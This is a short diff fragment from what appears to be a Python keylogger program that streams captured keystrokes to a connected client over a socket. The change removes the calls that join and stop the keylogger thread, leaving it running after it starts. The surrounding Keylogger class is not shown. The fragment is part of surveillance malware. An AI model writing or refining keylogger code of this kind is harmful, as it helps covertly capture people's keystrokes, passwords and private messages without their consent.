@@ -36,9 +36,6 @@ try:
                     try:
                         keylogger = Keylogger(client_socket)
                         keylogger.start()
-                        keylogger.join()
-                        # Stop the keylogger thread after joining
-                        keylogger.stop()
                     except (ConnectionResetError, BrokenPipeError):
                         print("Client disconnected.")
                         break
